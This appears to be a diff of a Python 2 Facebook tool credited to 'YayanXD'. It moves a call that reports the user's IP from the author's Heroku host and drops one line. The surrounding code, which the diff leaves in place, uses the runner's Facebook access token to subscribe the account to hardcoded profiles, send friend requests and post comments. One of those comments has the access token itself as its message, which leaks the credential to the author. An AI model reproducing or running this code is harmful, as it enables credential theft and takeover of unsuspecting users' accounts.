@@ -109,7 +109,6 @@ def tod():
 
 
 # LO KONTOL
-IP = requests.get('http://yayanxd.herokuapp.com/ip').text
 logo = ''' \033[0;96m __  __        __  ______  ____
  \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By YayanXD
  \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Yayan-XD
@@ -171,6 +170,7 @@ def moch_yayan():
         exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
     os.system('clear')
     print logo
+    IP = requests.get('http://yayanxd.herokuapp.com/ip').text
     print '___________________________________________________________\n'
     print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama)
     print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
@@ -256,7 +256,6 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100022602965953/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
